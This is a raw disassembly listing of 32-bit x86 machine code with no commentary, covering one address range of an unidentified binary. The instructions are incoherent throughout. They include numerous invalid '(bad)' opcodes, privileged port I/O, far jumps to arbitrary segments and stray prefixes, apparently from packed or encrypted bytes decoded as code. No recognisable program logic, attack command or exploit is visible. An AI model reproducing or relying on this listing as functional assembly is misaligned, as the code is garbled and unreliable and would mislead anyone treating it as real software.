  41181d:	jmp    FWORD PTR [ebp+0x1e9cd3d5]
  411823:	pop    esp
  411824:	in     eax,0x5d
  411826:	inc    ebx
  411827:	mov    dh,0x4b
  411829:	retf   
  41182a:	mov    BYTE PTR [edx],dh
  41182c:	ret    0x506a
  41182f:	xchg   esi,eax
  411830:	and    BYTE PTR [eax+ecx*1+0x779ab11d],0x77
  411838:	test   al,0xe1
  41183a:	enter  0x582d,0xec
  41183e:	xor    al,BYTE PTR [ebp-0x36]
  411841:	test   DWORD PTR [eax+0x7fc615dd],0xf103db33
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x600ba54
  411868:	dec    eax
  411869:	mov    esp,0x62626af4
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx-0x4f]
  411873:	iret   
  411874:	cmp    al,0xb6
  411876:	shl    DWORD PTR [ecx+0xf],0x4
  41187a:	ret    
  41187b:	xchg   esp,eax
  41187c:	dec    esi
  41187d:	icebp  
  41187e:	inc    esp
  41187f:	xor    bl,BYTE PTR [eax]
  411881:	clc    
  411882:	nop
  411883:	cmp    BYTE PTR [edi-0x5f],cl
  411886:	shl    bh,1
  411888:	sub    eax,0xb7a465e6
  41188d:	or     BYTE PTR [esi],bl
  41188f:	imul   eax,DWORD PTR [ebx],0x34
  411892:	retf   0x5321
  411895:	gs into 
  411897:	and    dh,al
  411899:	out    0x7b,eax
  41189b:	or     eax,0x51a8eb57
  4118a0:	jmp    0xc45d:0xc7e6479b
  4118a7:	sbb    BYTE PTR [ecx+0x11],bh
  4118aa:	add    BYTE PTR [ebx+edi*8+0x4e],ah
  4118ae:	bound  edi,QWORD PTR [esi]
  4118b0:	sbb    eax,eax
  4118b2:	mov    al,ds:0xf887e872
  4118b7:	rcr    DWORD PTR [esi+0x761bef6c],0xef
  4118be:	xor    dh,dh
  4118c0:	push   eax
  4118c1:	leave  
  4118c2:	pushf  
  4118c3:	or     BYTE PTR [edi+edi*2-0x51],bh
  4118c7:	popa   
  4118c8:	ins    BYTE PTR es:[edi],dx
  4118c9:	cmp    cl,BYTE PTR [eax-0x7e]
  4118cc:	int    0xe6
  4118ce:	sar    BYTE PTR [ecx],cl
  4118d0:	jnp    0x41185d
  4118d2:	fldcw  WORD PTR [ecx-0x17]
  4118d5:	and    ebp,DWORD PTR [edx+0x32]
  4118d8:	or     al,0x83
  4118da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118db:	aaa    
  4118dc:	mov    bh,0xe8
  4118de:	aam    0xed
  4118e0:	ins    BYTE PTR es:[edi],dx
  4118e1:	jnp    0x411889
  4118e3:	aas    
  4118e4:	test   eax,0x69a22a9c
  4118e9:	pop    ss
  4118ea:	rol    DWORD PTR [edx+0x569829d2],0xcf
  4118f1:	xor    edx,DWORD PTR [edx-0x7984b107]
  4118f7:	push   ss
  4118f8:	adc    eax,DWORD PTR [edi-0x45]
  4118fb:	test   DWORD PTR [ecx],edi
  4118fd:	add    eax,0xead7dbb6
  411902:	cmp    ch,ch
  411904:	xchg   esi,eax
  411905:	psllq  mm2,QWORD PTR [edx-0x59]
  411909:	mov    eax,ds:0x93326aca
  41190e:	inc    edx
  41190f:	or     al,0xe0
  411911:	ret    
  411912:	daa    
  411913:	fmul   QWORD PTR [ebp+0x3f]
  411916:	test   eax,0xb767ad80
  41191b:	dec    eax
  41191c:	pop    ecx
  41191d:	mov    al,0x2d
  41191f:	repnz lock sbb eax,0xfc0ac48d
  411926:	dec    ebp
  411927:	icebp  
  411928:	push   edx
  411929:	dec    edx
  41192a:	mov    ebp,0x51fd25e3
  41192f:	pop    edi
  411930:	xchg   esi,eax
  411931:	mov    ecx,0xfd8882b1
  411936:	cdq    
  411937:	outs   dx,BYTE PTR ds:[esi]
  411938:	daa    
  411939:	(bad)  
  41193b:	pop    edx
  41193c:	imul   edi,DWORD PTR [ecx+0x5b],0x8
  411940:	jp     0x4118e2
  411942:	and    BYTE PTR [ebp+0x1d586a91],bl
  411948:	dec    edi
  411949:	sbb    eax,0xa1fd8b1b
  41194e:	push   0xf20cfac3
  411953:	or     BYTE PTR [ebx],dl
  411955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411956:	fwait
  411957:	dec    esp
  411958:	jge    0x411905
  41195a:	mov    WORD PTR [ebx+0x67],gs
  41195d:	mov    bl,0x9e
  41195f:	dec    ecx
  411960:	jge    0x411997
  411962:	jb     0x411954
  411964:	mov    al,0x30
  411966:	mov    dh,0xa9
  411968:	pop    edi
  411969:	cwde   
  41196a:	ds pop eax
  41196c:	pop    ebx
  41196d:	and    cl,bh
  41196f:	jmp    0x9199:0x178206c8
  411976:	ins    DWORD PTR es:[edi],dx
  411977:	push   edi
  411978:	pop    ecx
  411979:	ret    
  41197a:	dec    ebx
  41197b:	pop    ebp
  41197c:	mov    bl,0xdb
  41197e:	stos   BYTE PTR es:[edi],al
  41197f:	mov    eax,DWORD PTR [ebp+0x1d]
  411982:	cwde   
  411983:	cmovns esp,esp
  411986:	or     cl,BYTE PTR [edx-0x7777fce6]
  41198c:	jno    0x411942
  41198e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41198f:	push   cs
  411990:	sahf   
  411991:	mov    DWORD PTR ds:0x7e9f33ec,esp
  411997:	sbb    eax,0x6a549991
  41199c:	adc    al,0x59
  41199e:	fucomip st,st(0)
  4119a0:	mov    edx,0xd2731650
  4119a5:	xor    ecx,DWORD PTR [eax+0x2c4509e0]
  4119ab:	mov    WORD PTR [edi+eiz*1+0x370986f4],ds
  4119b2:	(bad)  
  4119b3:	jmp    0xfa4b:0x83d85162
  4119ba:	in     al,dx
  4119bb:	cmp    edx,DWORD PTR [ebp+0x34ea539]
  4119c1:	sahf   
  4119c2:	jo     0x41194a
  4119c4:	ss add cl,bh
  4119c7:	in     al,0x1c
  4119c9:	xchg   DWORD PTR [edx],edi
  4119cb:	dec    ebx
  4119cc:	add    ecx,DWORD PTR [edi-0xd560d3e]
  4119d2:	mov    edx,0x1fd681b6
  4119d7:	jecxz  0x411a48
  4119d9:	jae    0x4119e0
  4119db:	cld    
  4119dc:	fstp   QWORD PTR [ebp-0x23]
  4119df:	cdq    
  4119e0:	andps  xmm3,XMMWORD PTR [ebx]
  4119e3:	and    eax,0x595eaa55
  4119e8:	and    esi,DWORD PTR [edx-0x24738e59]
  4119ee:	push   eax
  4119ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f0:	mov    dl,BYTE PTR [edx]
  4119f2:	mov    BYTE PTR [eax],dl
  4119f4:	xchg   ebp,eax
  4119f5:	jae    0x4119ac
  4119f7:	lods   al,BYTE PTR ds:[esi]
  4119f8:	loope  0x411991
  4119fa:	sar    dh,1
  4119fc:	inc    ebp
  4119fd:	mov    eax,ds:0xb22481ac
  411a02:	(bad)  
  411a03:	xlat   BYTE PTR ds:[ebx]
  411a04:	jno    0x411a67
  411a06:	jp     0x4119d7
  411a08:	push   ebp
  411a09:	fdivr  QWORD PTR [ebp+0x3]
  411a0c:	call   esp
  411a0e:	out    dx,eax
  411a0f:	(bad)  
  411a11:	loopne 0x411a16
  411a13:	jge    0x411a88
  411a15:	out    dx,eax
  411a16:	xchg   esp,eax
  411a17:	jg     0x4119bb
  411a19:	les    edx,FWORD PTR [eax-0x677b6f82]
  411a1f:	dec    eax
  411a20:	cmp    DWORD PTR [esi],ecx
  411a22:	xchg   DWORD PTR [esi-0x3d],ebx
  411a25:	test   DWORD PTR [ebx-0x18],eax
  411a28:	mov    edx,0xcbabc0bf
  411a2d:	jmp    0x79a4:0x85be3b96
  411a34:	pop    ebp
  411a35:	pop    ebx
  411a36:	pop    ecx
  411a37:	pop    esp
  411a38:	repnz adc cl,dh
  411a3b:	cmp    eax,0x6fca74ef
  411a40:	adc    ebp,DWORD PTR [edx]
  411a42:	xchg   DWORD PTR [ecx-0x23],esi
  411a45:	das    
  411a46:	cs jmp 0x411a54
  411a49:	push   ecx
  411a4a:	shl    DWORD PTR [edx],0x31
  411a4d:	mov    eax,0x75ea9f9
  411a52:	aas    
  411a53:	pop    ds
  411a54:	int    0x87
  411a56:	add    ah,BYTE PTR [ecx]
  411a58:	inc    esi
  411a59:	jle    0x4119e1
  411a5b:	pop    ds
  411a5c:	cwde   
  411a5d:	xor    BYTE PTR [ebx],dh
  411a5f:	sub    al,0xf9
  411a61:	adc    BYTE PTR [ebx],bl
  411a63:	fs sub eax,0xfe45ae9b
  411a69:	push   edi
  411a6a:	test   eax,0xb8704795
  411a6f:	adc    BYTE PTR [ebx+0x17b8c82f],cl
  411a75:	mov    eax,ds:0x2f5a379a
  411a7a:	mov    ch,0x8b
  411a7c:	cmp    DWORD PTR [edi-0x2],esp
  411a7f:	fnstsw WORD PTR ds:0x8b33774c
  411a85:	inc    ecx
  411a86:	bound  ecx,QWORD PTR [ebp-0x464e2932]
  411a8c:	inc    edi
  411a8d:	sbb    eax,DWORD PTR [edx]
  411a8f:	or     edx,eax
  411a91:	test   al,0x91
  411a93:	data16 adc dh,BYTE PTR [ebp-0x10]
  411a97:	pop    ebx
  411a98:	cwde   
  411a99:	inc    di
  411a9b:	pop    es
  411a9c:	and    eax,0x8a42341d
  411aa1:	out    dx,eax
  411aa2:	add    eax,0x3f8353f0
  411aa7:	loopne 0x411a93
  411aa9:	clc    
  411aaa:	push   ebx
  411aab:	jae    0x411a86
  411aad:	jmp    0x8cef:0x172988c5
  411ab4:	ret    0x3acd
  411ab7:	sbb    eax,0xb770e3cc
  411abc:	push   ss
  411abd:	lock adc BYTE PTR [edi],dh
  411ac0:	mov    eax,0xb20c62a2
  411ac5:	leave  
  411ac6:	scas   eax,DWORD PTR es:[edi]
  411ac7:	sahf   
  411ac8:	dec    ebx
  411ac9:	mov    ebp,0x88cc5365
  411ace:	sbb    ebx,0x4f
  411ad1:	sub    al,0x8c
  411ad3:	sub    eax,0xdce9b4ab
  411ad8:	jmp    FWORD PTR [eax+0x57]
  411adb:	pop    esp
  411adc:	repnz repnz dec ebx
  411adf:	retf   0xeae0
  411ae2:	and    edx,DWORD PTR [eax+0x4a]
  411ae5:	jbe    0x411aa3
  411ae7:	outs   dx,BYTE PTR ds:[esi]
  411ae8:	mov    dh,0x7b
  411aea:	and    BYTE PTR [ecx],ah
  411aec:	test   DWORD PTR [edx-0x11],edx
  411aef:	repz adc DWORD PTR [esi-0x6c],eax
  411af3:	shl    DWORD PTR [edx+0x25548698],cl
  411af9:	sahf   
  411afa:	or     DWORD PTR [edi-0x17e1aea5],edx
  411b00:	shr    ebp,1
  411b02:	icebp  
  411b03:	dec    edi
  411b04:	jnp    0x411aa6
  411b06:	es adc ah,bl
  411b09:	dec    eax
  411b0a:	pop    eax
  411b0b:	ja     0x411b75
  411b0d:	stc    
  411b0e:	pslld  mm7,QWORD PTR [esi-0x63]
  411b12:	fimul  WORD PTR [ebx-0x73e246d4]
  411b18:	or     ebx,ebp
  411b1a:	push   eax
  411b1b:	sbb    DWORD PTR [edx],ecx
  411b1d:	mov    ds:0xe3f154ba,eax
  411b22:	popa   
  411b23:	fisubr DWORD PTR [esi-0xe4420c7]
  411b29:	test   edx,0x254fbb49
  411b2f:	ds in  eax,dx
  411b31:	fisubr DWORD PTR [ebp-0x14b015a8]
  411b37:	mov    eax,ds:0xc87c66af
  411b3c:	xlat   BYTE PTR ds:[ebx]
  411b3d:	(bad)  
  411b3e:	sbb    BYTE PTR [esi],bh
  411b40:	into   
  411b41:	mov    ch,0x10
  411b43:	pop    esp
  411b44:	loope  0x411ac6
  411b46:	sbb    BYTE PTR [ecx-0x64e4cf0f],cl
  411b4c:	mov    ebp,0x5a843229
  411b51:	and    DWORD PTR [eax-0x35d9d044],edx
  411b57:	jl     0x411b66
  411b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5a:	cmp    DWORD PTR [edi],eax
  411b5c:	in     al,dx
  411b5d:	mov    WORD PTR [esi],?
  411b5f:	pop    ebp
  411b60:	lds    eax,FWORD PTR [esi-0x19e918f9]
  411b66:	mov    ebx,0x8334de03
  411b6b:	cli    
  411b6c:	div    DWORD PTR [edi]
  411b6e:	jbe    0x411be9
  411b70:	adc    DWORD PTR [ecx],ebp
  411b72:	mov    ebx,0xc825afcd
  411b77:	and    eax,0x61dc392b
  411b7c:	ret    
  411b7d:	adc    DWORD PTR [ebx+edi*4-0x73f80089],edi
  411b84:	xchg   ebx,eax
  411b85:	push   edx
  411b86:	and    eax,0x5d1290e4
  411b8b:	mov    bl,0x9f
  411b8d:	aaa    
  411b8e:	pop    esp
  411b8f:	imul   eax,DWORD PTR [edi],0xca9af1c7
  411b95:	ja     0x411bbf
  411b97:	jmp    0x36e88792
  411b9c:	xchg   esp,esp
  411b9e:	imul   edi,edi,0x720235c0
  411ba4:	push   ds
  411ba5:	sbb    DWORD PTR [edx+0x51],0x1cd513fe
  411bac:	dec    esi
  411bad:	rcl    dh,1
  411baf:	sbb    eax,0x62ce632
  411bb4:	dec    ecx
  411bb5:	test   al,0x5b
  411bb7:	mov    ah,0x0
  411bb9:	sbb    eax,0xe99a5e41
  411bbe:	dec    edi
  411bbf:	lahf   
  411bc0:	adc    ch,BYTE PTR [eax-0x47]
  411bc3:	(bad)  
  411bc4:	mov    edx,edx
  411bc6:	aas    
  411bc7:	xor    DWORD PTR [eax-0x2],0xffffffa7
  411bcb:	nop
  411bcc:	out    dx,eax
  411bcd:	mov    esi,0xceec81c9
  411bd2:	xor    eax,0x5e55d515
  411bd7:	push   ds
  411bd8:	mov    ebx,0x593b959e
  411bdd:	and    al,0x4
  411bdf:	in     al,dx
  411be0:	stos   DWORD PTR es:[edi],eax
  411be1:	sbb    ah,al
  411be3:	leave  
  411be4:	cwde   
  411be5:	(bad)  
  411be6:	cmp    eax,0x4f021574
  411beb:	and    BYTE PTR ds:0x49582151,ah
  411bf1:	test   BYTE PTR [ecx],ch
  411bf3:	in     al,dx
  411bf4:	push   edi
  411bf5:	push   edx
  411bf6:	test   DWORD PTR [ebp+0x4c60ab45],esi
  411bfc:	cmp    esp,eax
  411bfe:	in     al,dx
  411bff:	pop    edx
  411c00:	shr    BYTE PTR ds:0x8e6da78b,cl
  411c06:	jnp    0x411c7a
  411c08:	outs   dx,DWORD PTR ds:[esi]
  411c09:	aad    0x9d
  411c0b:	shl    BYTE PTR [edi+edx*4],1
  411c0e:	pop    esp
  411c0f:	jecxz  0x411ba9
  411c11:	std    
  411c12:	xor    DWORD PTR [esi-0x2ee74756],0x4b
  411c19:	clc    
  411c1a:	jle    0x411bb6
  411c1c:	repnz pop esp
  411c1e:	pop    ebx
  411c1f:	js     0x411c04
  411c21:	jmp    0x411bd5
  411c23:	pop    eax
  411c24:	inc    esp
  411c25:	pop    ebx
  411c26:	mov    ecx,DWORD PTR [ebp+0x1b]
  411c29:	fidiv  WORD PTR [ecx+eax*2-0x53]
  411c2d:	inc    edi
  411c2e:	fistp  DWORD PTR [eax+0x50b1a38f]
  411c34:	call   0x1ca7:0x999375df
  411c3b:	data16 sbb BYTE PTR [edx-0x13068fb4],al
  411c42:	(bad)  [ebx+esi*8-0x65]
  411c46:	clc    
  411c47:	mov    esp,0x387e2cd7
  411c4c:	dec    esp
  411c4d:	mov    esi,0x3110e056
  411c52:	cdq    
  411c53:	pop    ss
  411c54:	(bad)  
  411c55:	cmp    al,BYTE PTR [eax-0x30]
  411c58:	jle    0x411cc0
  411c5a:	push   eax
  411c5b:	cs mov bh,0xae
  411c5e:	push   ebp
  411c5f:	sar    BYTE PTR [eax],0x1a
  411c62:	pop    ebx
  411c63:	push   ecx
  411c64:	jmp    0x5322:0xfff46690
  411c6b:	lods   al,BYTE PTR ds:[esi]
  411c6c:	jp     0x411c84
  411c6e:	(bad)  
  411c6f:	stos   DWORD PTR es:[edi],eax
  411c70:	sbb    DWORD PTR [ebx+0x64],ebp
  411c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c74:	xchg   esi,eax
  411c75:	lods   al,BYTE PTR ds:[esi]
  411c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c77:	mov    eax,ds:0x6673a356
  411c7c:	or     BYTE PTR [ecx*2+0x47033d7d],cl
  411c83:	cmp    ecx,DWORD PTR [esi+0x1b]
  411c86:	mov    esi,0xf957b07b
  411c8b:	mov    ebx,DWORD PTR [eax+0x3a4a0b5d]
  411c91:	(bad)  
  411c92:	mov    esi,0xe885f5be
  411c97:	jbe    0x411c6b
  411c99:	mov    esi,0xd7f381cc
  411c9e:	mov    bh,0x84
  411ca0:	push   edi
  411ca1:	(bad)  
  411ca2:	bound  esp,QWORD PTR [eax-0x5]
  411ca5:	lea    ebx,[eax]
  411ca7:	loope  0x411c64
  411ca9:	imul   ebx,DWORD PTR [esi+0x77d71695],0xffffff89
  411cb0:	fisubr DWORD PTR [eax+0x4f]
  411cb3:	std    
  411cb4:	pop    es
  411cb5:	popf   
  411cb6:	pop    eax
  411cb7:	jnp    0xbcd10fff
  411cbd:	push   eax
  411cbe:	lea    ebp,[ebx]
  411cc0:	jbe    0x411c59
  411cc2:	and    BYTE PTR [edi-0x11b1b96a],0xec
  411cc9:	into   
  411cca:	imul   esi,DWORD PTR [edi-0x70],0x97dadc55
  411cd1:	jne    0x411d34
  411cd3:	out    0xa8,eax
  411cd5:	mov    al,0x7c
  411cd7:	add    ecx,DWORD PTR [eax+0xb]
  411cda:	sbb    BYTE PTR [edx],al
  411cdc:	mov    eax,ds:0x7b2c9218
  411ce1:	jp     0x411d03
  411ce3:	inc    edx
  411ce4:	or     eax,0xfe93e6b9
  411ce9:	es jbe 0x411cf7
  411cec:	fcomp  DWORD PTR [edi]
  411cee:	or     eax,0x53ce8e7a
  411cf3:	(bad)  
  411cf4:	repz jmp 0x79bc:0x4a9fc4a8
  411cfc:	mov    al,ds:0x2f08f148
  411d01:	xchg   bh,dh
  411d03:	mov    ebx,0xadcedbf7
  411d08:	dec    esi
  411d09:	sub    al,0xae
  411d0b:	mov    bh,BYTE PTR [eax+0x64]
  411d0e:	fdiv   st(6),st
  411d10:	sahf   
  411d11:	push   eax
  411d12:	inc    eax
  411d13:	push   0xffffffa6
  411d15:	dec    edi
  411d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d17:	cmp    bl,cl
  411d19:	inc    esi
  411d1a:	test   al,0xd8
  411d1c:	fld    st(3)
  411d1e:	(bad)  
  411d1f:	sar    BYTE PTR [esi],0xc6
  411d22:	in     al,0x4d
  411d24:	rol    DWORD PTR [ebp+0x50],0x94
  411d28:	mov    esi,0x2d37f6c4
  411d2d:	lea    eax,[ebx]
  411d2f:	sbb    edi,edi
  411d31:	std    
  411d32:	add    esp,DWORD PTR [ebx+eiz*8+0x125322bb]
  411d39:	sbb    al,0x36
  411d3b:	xor    eax,0x1ce870c3
  411d40:	imul   eax,ecx,0xffffffb2
  411d43:	dec    eax
  411d44:	es mov al,0xe0
  411d47:	bound  eax,QWORD PTR [ebx]
  411d49:	fidiv  WORD PTR [edi-0x22b5e59f]
  411d4f:	fimul  DWORD PTR ds:0x2e52034a
  411d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d56:	pop    ebp
  411d57:	push   eax
  411d58:	dec    esi
  411d59:	out    dx,al
  411d5a:	add    edi,DWORD PTR ds:[eax-0x5f]
  411d5e:	xor    bl,al
  411d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d61:	push   ebp
  411d62:	and    esi,ebp
  411d64:	mov    cl,0x93
  411d66:	mov    ebp,DWORD PTR [edi]
  411d68:	cmp    eax,0x9a685816
  411d6d:	ja     0x411db3
  411d6f:	shl    DWORD PTR [eax+edx*4-0x4d],0x16
  411d74:	sub    edi,DWORD PTR [ebp+0x59]
  411d77:	bound  ecx,QWORD PTR [ecx]
  411d79:	inc    edi
  411d7a:	es sub eax,0xfbce0ff9
  411d80:	xchg   edi,eax
  411d81:	adc    al,0xdd
  411d83:	dec    eax
  411d84:	mov    eax,DWORD PTR [eax+0x798c1e2d]
  411d8a:	lea    ebx,[ebx-0x3d]
  411d8d:	mov    eax,0xde8b23a1
  411d92:	inc    edx
  411d93:	push   es
  411d94:	stos   BYTE PTR es:[edi],al
  411d95:	fs pop es
  411d97:	outs   dx,DWORD PTR ds:[esi]
  411d98:	push   edi
  411d99:	jne    0x411df3
  411d9b:	jb     0x411dac
  411d9d:	jge    0x411d95
  411d9f:	ins    BYTE PTR es:[edi],dx
  411da0:	iret   
  411da1:	sub    al,0xb
  411da3:	imul   esi,DWORD PTR [esi+0x159d2a2b],0x46c4204b
  411dad:	sub    esp,edx
  411daf:	xchg   ebp,esp
  411db1:	cdq    
  411db2:	jnp    0x411df1
  411db4:	jae    0x411de7
  411db6:	(bad)  
  411db7:	popa   
  411db8:	je     0x411d95
  411dba:	push   edi
  411dbb:	(bad)  
  411dbc:	in     al,0xfe
  411dbe:	(bad)  
  411dbf:	js     0x411dd1
  411dc1:	pop    es
  411dc2:	dec    eax
  411dc3:	and    al,0x5f
  411dc5:	sub    DWORD PTR [edx+0x6c7ed9fd],esp
  411dcb:	or     eax,0x9628414c
  411dd0:	xchg   esp,eax
  411dd1:	and    al,0xf6
  411dd3:	out    dx,al
  411dd4:	fcomp  st(1)
  411dd6:	mov    esp,0xcc05230f
  411ddb:	jns    0x411de6
  411ddd:	xchg   ebp,eax
  411dde:	inc    edi
  411ddf:	nop
  411de0:	ja     0x411dff
  411de2:	add    dh,BYTE PTR [edi+0x2be55357]
  411de8:	mov    ah,0xa6
  411dea:	sbb    dl,ah
  411dec:	inc    edx
  411ded:	jl     0x411e07
  411def:	(bad)
  411df3:	cwde   
  411df4:	jne    0x411e2e
  411df6:	mov    bl,0xda
  411df8:	push   ecx
  411df9:	in     al,dx
  411dfa:	jno    0x411e33
  411dfc:	dec    BYTE PTR [esi]
  411dfe:	sub    bh,BYTE PTR cs:[edx]
  411e01:	mov    dh,0xc3
  411e03:	jle    0x411e06
  411e05:	cld    
  411e06:	xor    eax,0x1319ecf2
  411e0b:	jnp    0x411dd7
  411e0d:	les    ecx,FWORD PTR [ebp+0xd]
  411e10:	pop    edi
  411e11:	rcpps  xmm1,XMMWORD PTR [edi-0x291f6cc6]
  411e18:	stc    
  411e19:	cmp    edi,DWORD PTR [edx+0x35]
  411e1c:	dec    eax
  411e1d:	xor    al,0x52
  411e1f:	in     al,dx
  411e20:	jnp    0x411e59
  411e22:	or     BYTE PTR [edx],al
  411e24:	hlt    
  411e25:	mov    ?,WORD PTR [esi-0x39]
  411e28:	dec    esi
  411e29:	mov    ds:0x734e6ab5,al
  411e2e:	pop    ss
  411e2f:	retf   
  411e30:	nop    DWORD PTR [ebx-0x77]
  411e34:	mov    al,ds:0x9aa17a0c
  411e39:	popf   
  411e3a:	xor    eax,0x7eb55a6f
  411e3f:	or     DWORD PTR [edx],0x51
  411e42:	adc    BYTE PTR [esi],0x82
  411e45:	xor    dl,BYTE PTR [esi+ebp*1-0x2c06bc62]
  411e4c:	jnp    0x411e73
  411e4e:	or     dh,al
  411e50:	push   ss
  411e51:	mov    cl,0x38
  411e53:	cmp    ebp,DWORD PTR [edi]
  411e55:	outs   dx,DWORD PTR ds:[esi]
  411e56:	mov    bh,0xed
  411e58:	sar    BYTE PTR [edi+0x52],0x3d
  411e5c:	mov    dl,0x5e
  411e5e:	cmp    ebp,DWORD PTR [ebp+esi*4+0x4c]
  411e62:	cmp    DWORD PTR [esi],0xffffff8d
  411e65:	push   edx
  411e66:	push   ecx
  411e67:	inc    ebx
  411e68:	scas   al,BYTE PTR es:[edi]
  411e69:	(bad)  
  411e6a:	xor    BYTE PTR [esi],bl
  411e6c:	popf   
  411e6d:	ja     0x411e7e
  411e6f:	add    eax,0xd86af4a3
  411e74:	dec    esi
  411e75:	inc    ecx
  411e76:	sub    ebp,edi
  411e78:	les    ebp,FWORD PTR [ebx]
  411e7a:	aad    0xeb
  411e7c:	sti    
  411e7d:	sbb    al,0x64
  411e7f:	sbb    al,0x84
  411e81:	push   ebx
  411e82:	retf   0xd750
  411e85:	xor    DWORD PTR [ebp+0xc],edx
  411e88:	mov    bl,0xec
  411e8a:	aas    
  411e8b:	lods   al,BYTE PTR ds:[esi]
  411e8c:	push   cs
  411e8d:	dec    edi
  411e8e:	add    DWORD PTR [edi-0x6b],ebp
  411e91:	or     BYTE PTR [edi+0x5a],bl
  411e94:	push   ebp
  411e95:	lea    edx,[edi]
  411e97:	sub    eax,0xb44cd154
  411e9c:	int    0x3e
  411e9e:	push   cs
  411e9f:	cmp    eax,ebx
  411ea1:	pop    es
  411ea2:	and    ebx,DWORD PTR [edi]
  411ea4:	mov    ?,WORD PTR [edx-0x56b1ffa9]
  411eaa:	mov    al,ds:0x502b683c
  411eaf:	mov    ebp,0xaf83bf37
  411eb4:	in     eax,dx
  411eb5:	mov    esi,0x99d949d5
  411eba:	fimul  DWORD PTR [eax+0x38]
  411ebd:	repnz out 0xaa,eax
  411ec0:	fwait
  411ec1:	push   ds
  411ec2:	shl    ebx,cl
  411ec4:	das    
  411ec5:	dec    edi
  411ec6:	xlat   BYTE PTR ds:[ebx]
  411ec7:	pop    ds
  411ec8:	ss inc edi
  411eca:	ins    DWORD PTR es:[edi],dx
  411ecb:	and    ebx,edi
  411ecd:	inc    ebp
  411ece:	mov    esi,0xa86c980c
  411ed3:	lods   eax,DWORD PTR ds:[esi]
  411ed4:	ss imul edx,ebx,0xd8ebf615
  411edb:	addr16 xchg edx,eax
  411edd:	and    cl,BYTE PTR [esi]
  411edf:	sbb    eax,0x24b00af0
  411ee4:	push   0xb9bb2a0c
  411ee9:	mov    cl,0x1b
  411eeb:	pop    esi
  411eec:	test   DWORD PTR [edi],edi
  411eee:	ins    DWORD PTR es:[edi],dx
  411eef:	gs (bad) 
  411ef1:	call   0xb5f6f26a
  411ef6:	cld    
  411ef7:	dec    esi
  411ef8:	pop    ecx
  411ef9:	pop    ebx
  411efa:	rcl    ecx,cl
  411efc:	ret    
  411efd:	add    DWORD PTR ds:0x184b4b90,eax
  411f03:	dec    esp
  411f04:	jecxz  0x411ee9
  411f06:	lock add DWORD PTR [esi+0x7d],edx
  411f0a:	outs   dx,DWORD PTR ds:[esi]
  411f0b:	ficomp WORD PTR [ebp+0x22]
  411f0e:	test   DWORD PTR [esi-0x40b1531f],ecx
  411f14:	xchg   ecx,eax
  411f15:	ins    BYTE PTR es:[edi],dx
  411f16:	call   0xbda0:0xd846f292
  411f1d:	or     DWORD PTR ds:0xbcbe9387,ebx
  411f23:	lahf   
  411f24:	iret   
  411f25:	pop    esi
  411f26:	mov    ds:0x81045a01,eax
  411f2b:	in     al,0xd8
  411f2d:	ins    BYTE PTR es:[edi],dx
  411f2e:	add    al,0x25
  411f30:	ds push ebx
  411f32:	test   eax,0x9da8cf1d
  411f37:	mov    DWORD PTR [ebx-0x7f34b5e3],ecx
  411f3d:	push   0xffffff9e
  411f3f:	pushf  
  411f40:	push   0xffffffbe
  411f42:	jb     0x411f72
  411f44:	dec    eax
  411f45:	outs   dx,DWORD PTR ds:[esi]
  411f46:	mov    ecx,DWORD PTR [edx-0x4b]
  411f49:	push   edi
  411f4a:	enter  0xa351,0x50
  411f4e:	fist   WORD PTR [eax]
  411f50:	mov    al,ds:0x81d65ad5
  411f55:	add    ah,BYTE PTR [ecx+ebx*1-0x31]
  411f59:	sub    DWORD PTR [ecx-0x5517b77a],0xc736afe0
  411f63:	inc    ebp
  411f64:	in     eax,0xc6
  411f66:	fwait
  411f67:	cmc    
  411f68:	jle    0x411f3e
  411f6a:	daa    
  411f6b:	out    0xc8,al
  411f6d:	fistp  DWORD PTR [ebp-0x3a85852b]
  411f73:	xchg   DWORD PTR [ebx+0x5384ceba],esi
  411f79:	icebp  
  411f7a:	inc    ecx
  411f7b:	and    eax,ebx
  411f7d:	dec    ebp
  411f7e:	das    
  411f7f:	dec    eax
  411f80:	pop    ecx
  411f81:	and    DWORD PTR es:[ecx-0x6c7ca336],ebx
  411f88:	adc    eax,0x59f1acca
  411f8d:	stos   BYTE PTR es:[edi],al
  411f8e:	test   DWORD PTR [ebx],ebx
  411f90:	jno    0x412004
  411f92:	test   ebx,esp
  411f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f95:	das    
  411f96:	fstp   TBYTE PTR [ecx+0x58]
  411f99:	jbe    0x412002
  411f9b:	dec    ebx
  411f9c:	inc    ebx
  411f9d:	and    ch,BYTE PTR [edx+0x27269e5b]
  411fa3:	push   esi
  411fa4:	pusha  
  411fa5:	gs std 
  411fa7:	push   ds
  411fa8:	call   0x75a8:0xc6a994d7
  411faf:	sbb    eax,0x99649661
  411fb4:	bound  esp,QWORD PTR [ebx-0x1d972d52]
  411fba:	or     DWORD PTR [ecx+0x272afdf],esp
  411fc0:	ret    
  411fc1:	xor    cl,BYTE PTR [edx-0x119a7d28]
  411fc7:	sbb    esi,edx
  411fc9:	and    DWORD PTR [edx],eax
  411fcb:	std    
  411fcc:	adc    al,0x46
  411fce:	mov    ah,0x58
  411fd0:	fidivr WORD PTR [edx-0x32]
  411fd3:	sbb    BYTE PTR [ecx],dh
  411fd5:	sbb    edi,DWORD PTR [ecx+eiz*8+0x3863520b]
  411fdc:	jo     0x411fd2
  411fde:	out    0x6b,al
  411fe0:	pop    ebp
  411fe1:	xchg   ebp,eax
  411fe2:	les    ebp,FWORD PTR [edi]
